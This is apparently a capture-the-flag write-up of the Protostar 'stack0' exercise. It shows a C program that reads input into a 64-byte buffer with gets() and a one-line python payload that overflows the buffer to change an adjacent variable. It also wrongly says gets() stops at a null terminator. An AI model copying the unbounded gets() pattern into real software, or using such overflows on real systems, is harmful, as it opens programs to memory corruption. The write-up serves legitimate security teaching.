For this challenge we are presented with the following source code.

'''
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
'''

So looking at this code, we can tell that it first establishes a buffer variable, and an integer variable. It then uses the insecure gets function to just take input. It then checks to see if the value of the integer variable is the same as it declared it. If it changed, then we won. To change this value we can exploit the gets function. 

Thing is the data that is imported via the gets function is only designated to take up the space defined by the buffer variable, which is equivalent to 64 characters. The gets function will input as much data as it can, until a null terminator or it just crashes. So if we input more characters than 64, then we will overwrite another location on the memory which will hopefully be the int variable. Let’s try that.

'''
echo `python -c ‘print “1”*65’` | ./stack0
'''

You have changed the ‘modified’ variable

And just like that, we pwned the elf.
